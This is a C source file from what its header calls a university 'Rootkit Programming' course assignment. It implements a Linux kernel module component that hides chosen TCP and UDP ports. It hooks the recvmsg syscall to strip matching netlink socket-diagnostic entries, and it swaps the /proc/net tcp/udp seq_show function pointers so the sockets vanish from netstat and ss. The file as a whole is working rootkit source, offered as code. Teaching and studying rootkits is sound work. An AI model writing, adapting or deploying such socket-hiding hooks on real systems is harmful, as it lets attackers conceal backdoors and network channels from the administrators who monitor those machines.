
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: socket_masking.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
#include <linux/inet_diag.h>	/* Needed for ntohs */
#include <net/tcp.h>			/* Needed for struct tcp_seq_afinfo */
#include <net/udp.h>			/* Needed for struct udp_seq_afinfo */

#include "core.h"


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit socket_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define PRINT_SOCKET(protocol, port) printk(KERN_INFO "rootkit socket_masking: masking socket (%s, %d)\n", (protocol), (port))
#define DEBUG_PRINT_SOCKET(protocol, port) if (show_debug_messages) PRINT_SOCKET(protocol, port)


/* Definition of data structs */
struct masked_socket {   /* List to keep hidden sockets */
	struct list_head list;
	int port;
};


/* Definition of global variables */
static int show_debug_messages;
static struct list_head masked_tcp4_sockets;
static struct list_head masked_tcp6_sockets;
static struct list_head masked_udp4_sockets;
static struct list_head masked_udp6_sockets;
asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
asmlinkage int (*original_udp4_show) (struct seq_file *, void *);
asmlinkage int (*original_udp6_show) (struct seq_file *, void *);


/* Declaration of functions */
int socket_masking_init(int);
int socket_masking_exit(void);

asmlinkage ssize_t socket_masking_recvmsg_syscall(int, struct user_msghdr __user *, unsigned, ssize_t);

int mask_socket(char *protocol, int port);
int unmask_socket(char *protocol, int port);

static void delete_masked_sockets(void);

static void netstat_masking_init(void);
static void netstat_masking_exit(void);

static int is_invalid_port(int);
static int is_invalid_protocol(char *);
static int data_should_be_masked(struct nlmsghdr *);

static int my_tcp4_show(struct seq_file *, void *);
static int my_tcp6_show(struct seq_file *, void *);
static int my_udp4_show(struct seq_file *, void *);
static int my_udp6_show(struct seq_file *, void *);

static int socket_is_masked(char *, int);
static struct list_head *get_sockets_list_ptr(char *);


/* Definition of data structs */
/*****************************************************************************/
/*                                                                           */
/*    DEFINITION BELOW IS TAKEN FROM fs/proc/internal.h, lines 21-52         */
/*                                                                           */
/*****************************************************************************/

/*
 * This is not completely implemented yet. The idea is to
 * create an in-memory tree (like the actual /proc filesystem
 * tree) of these proc_dir_entries, so that we can dynamically
 * add new files to /proc.
 *
 * parent/subdir are used for the directory structure (every /proc file has a
 * parent, but "subdir" is empty for all non-directory entries).
 * subdir_node is used to build the rb tree "subdir" of the parent.
 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;					/* use count */
		atomic_t in_use;				/* number of callers into module in progress; */
										/* negative -> it's going away RSN */
		struct completion *pde_unload_completion;
		struct list_head pde_openers;	/* who did ->open, but not ->release */
		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
		u8 namelen;
		char name[];
};


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int socket_masking_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	INIT_LIST_HEAD(&masked_tcp4_sockets);
	INIT_LIST_HEAD(&masked_tcp6_sockets);
	INIT_LIST_HEAD(&masked_udp4_sockets);
	INIT_LIST_HEAD(&masked_udp6_sockets);

	netstat_masking_init();

	register_callback(__NR_recvmsg, (void *) socket_masking_recvmsg_syscall);

	DEBUG_PRINT("initialized");

	return 0;
}


int socket_masking_exit(void)
{
	deregister_callback(__NR_recvmsg, (void *) socket_masking_recvmsg_syscall);

	netstat_masking_exit();

	delete_masked_sockets();

	return 0;
}


/* Function that replaces the original `recvmsg` syscall. Initially, it calls the original
   `recvmsg` which fills the given msg buffer. We realize whether we are reading from a netlink
   socket with the help of some netlink utility macros. If a netlink socket is being used, we
   iterate through the inet diag msg structs (each prepended by a nlmsghdr) and compare the
   source and destination ports with our list of hidden ones. In order to hide an entry we copy
   the remaining entries over it and adjust the data length which is returned to the user. */
asmlinkage ssize_t socket_masking_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags, ssize_t ret)
{
	struct nlmsghdr *nlh;
	long count;
	int found;
	char *stream;
	int offset;
	int i;

	/* Some error occured. Don't do anything. */
	if (ret < 0)
		return ret;

	/* Extract netlink message header from message */
	nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);

	/* Number of bytes remaining in message stream */
    count = ret;

	/* Set flag specifying whether message contains data to be masked */
	found = 1;

	/* NLMSG_OK: This macro will return true if a netlink message was received. It
	   essentially checks whether it's safe to parse the netlink message (if indeed
	   is a netlink message) using the other NLMSG_* macros. */
	while (NLMSG_OK(nlh, count)) {

		if (found == 0)
			/* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
			nlh = NLMSG_NEXT(nlh, count);

		if (!data_should_be_masked(nlh)) {
			found = 0;
			continue;
		}

		/* Message contains data to be masked */
		found = 1;

		stream = (char *) nlh;

		/* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
		offset = NLMSG_ALIGN((nlh)->nlmsg_len);

		/* Copy remaining entries over the data to be masked */
		for (i=0 ; i<count ; i++)
			stream[i] = stream[i + offset];

		/* Adjust the data length */
		ret -= offset;
	}

	return ret;
}


int mask_socket(char *protocol, int port)
{
	struct masked_socket *new;

	if (is_invalid_protocol(protocol) || is_invalid_port(port))
		return -1;

	if (socket_is_masked(protocol, port))
		return -1;

	if ((new = kmalloc(sizeof(struct masked_socket), GFP_KERNEL)) == NULL)
		return -ENOMEM;

	new->port = port;

	list_add(&new->list, get_sockets_list_ptr(protocol));

	return 0;
}


int unmask_socket(char *protocol, int port)
{
	struct masked_socket *cur;
	struct list_head *cursor, *next;

	if (is_invalid_protocol(protocol) || is_invalid_port(port))
		return -1;

	list_for_each_safe(cursor, next, get_sockets_list_ptr(protocol)) {
		cur = list_entry(cursor, struct masked_socket, list);
		if (cur->port == port) {
			list_del(cursor);
			kfree(cur);

			return 0;
		}
	}

	return -EINVAL;
}


static void delete_masked_sockets(void)
{
	struct list_head *cursor, *next;
	struct masked_socket *masked_socket_ptr;

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_tcp4_sockets) {
		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
		list_del(cursor);
		kfree(masked_socket_ptr);
	}

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_tcp6_sockets) {
		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
		list_del(cursor);
		kfree(masked_socket_ptr);
	}

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_udp4_sockets) {
		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
		list_del(cursor);
		kfree(masked_socket_ptr);
	}

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_udp6_sockets) {
		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
		list_del(cursor);
		kfree(masked_socket_ptr);
	}
}


/* This function masks sockets from the netstat system program. The netstat system
   program uses the contents of the files in /proc/tcp and /proc/udp/ to get socket
   information. The files /proc/tcp and /proc/udp are so called sequence files and are
   sequentially filled on request by the corresponding seq functions of tcp and udp. We
   find access to those functions by the proc dir entries of tcp and udp. These entries
   are found in a red black tree rooted by the proc dir entry `net`. Once we find them,
   we retreive their file operations, make a backup of the tcp_seq_show and the
   udp_seq_show functions and replace their pointers by the ones of our custom functions.
   The hooked functions emulate the original ones but return a length of zero if the
   given socket uses a hidden port as source or destination port. */
static void netstat_masking_init(void)
{
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	/* Get the proc dir entry for /proc/<pid>/net */
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		//PRINT(proc_dir_entryptr->name);

		/* Search for the entries called tcp, tcp6, udp and udp6 */
		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq = proc_dir_entryptr->data;
			original_tcp4_show = tcp_seq->seq_ops.show;

			/* Hook the kernel function tcp4_seq_show */
			tcp_seq->seq_ops.show = my_tcp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp_seq = proc_dir_entryptr->data;
			original_tcp6_show = tcp_seq->seq_ops.show;

			/* Hook the kernel function tcp6_seq_show */
			tcp_seq->seq_ops.show = my_tcp6_show;
		} else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq = proc_dir_entryptr->data;
			original_udp4_show = udp_seq->seq_ops.show;

			/* Hook the kernel function udp4_seq_show */
			udp_seq->seq_ops.show = my_udp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp_seq = proc_dir_entryptr->data;
			original_udp6_show = udp_seq->seq_ops.show;

			/* Hook the kernel function udp6_seq_show */
			udp_seq->seq_ops.show = my_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}
}


/* This function unmasks sockets from the `netstat` system program.
   It restores the original tcp_seq_show and udp_seq_show functions. */
static void netstat_masking_exit(void)
{
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	proc_rb_root = init_net.proc_net->subdir;
	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		//PRINT(proc_dir_entryptr->name);

		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq = proc_dir_entryptr->data;
			tcp_seq->seq_ops.show = original_tcp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp_seq = proc_dir_entryptr->data;
			tcp_seq->seq_ops.show = original_tcp6_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq = proc_dir_entryptr->data;
			udp_seq->seq_ops.show = original_udp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp_seq = proc_dir_entryptr->data;
			udp_seq->seq_ops.show = original_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}
}


/* Function that checks whether specified netlink message contains data to be masked */
static int data_should_be_masked(struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r;
	int port;

	/* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
	r = NLMSG_DATA(nlh);

	/* From the ancilliary data extract the port associated with the socket identity */
	port = ntohs(r->id.idiag_sport);

	if (socket_is_masked("tcp4", port) ||
			socket_is_masked("tcp6", port) ||
			socket_is_masked("udp4", port) ||
			socket_is_masked("udp6", port))
		return 1;

	return 0;
}


/* This function checks if the specified port belongs to the valid port range [0-65535] */
static int is_invalid_port(int port)
{
	if (port < 0 || 65535 < port)
		return 1;

	return 0;
}


/* This function checks if the specified protocol is valid */
static int is_invalid_protocol(char *protocol)
{
	if (strcmp(protocol, "tcp4") != 0 &&
			strcmp(protocol, "tcp6") != 0 &&
			strcmp(protocol, "udp4") != 0 &&
			strcmp(protocol, "udp6") != 0)
		return 1;

	return 0;
}


/* The functions below emulate the original seq functions of tcp and udp but return a
   length of zero if the given socket uses a hidden port as source or destination port. */
static int my_tcp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_tcp4_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (socket_is_masked("tcp4", port)) {
		DEBUG_PRINT_SOCKET("tcp4", port);

		return 0;
	}

	return original_tcp4_show(m, v);
}


static int my_tcp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_tcp6_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (socket_is_masked("tcp6", port)) {
		DEBUG_PRINT_SOCKET("tcp6", port);

		return 0;
	}

	return original_tcp6_show(m, v);
}


static int my_udp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_udp4_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (socket_is_masked("udp4", port)) {
		DEBUG_PRINT_SOCKET("udp4", port);

		return 0;
	}

	return original_udp4_show(m, v);
}


static int my_udp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_udp6_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (socket_is_masked("udp6", port)) {
		DEBUG_PRINT_SOCKET("udp6", port);

		return 0;
	}

	return original_udp6_show(m, v);
}


/* Function that checks whether we need to mask the specified socket */
static int socket_is_masked(char *protocol, int port)
{
	struct masked_socket *cur;
	struct list_head *cursor;

	list_for_each(cursor, get_sockets_list_ptr(protocol)) {
		cur = list_entry(cursor, struct masked_socket, list);
		if (cur->port == port)
			return 1;
	}

	return 0;
}


/* Function that checks whether we need to mask the specified socket */
static struct list_head *get_sockets_list_ptr(char *protocol)
{
	if (!strcmp(protocol, "tcp4"))
		return &masked_tcp4_sockets;
	else if (!strcmp(protocol, "tcp6"))
		return &masked_tcp6_sockets;
	else if (!strcmp(protocol, "udp4"))
		return &masked_udp4_sockets;
	else if (!strcmp(protocol, "udp6"))
		return &masked_udp6_sockets;

	return NULL;
}
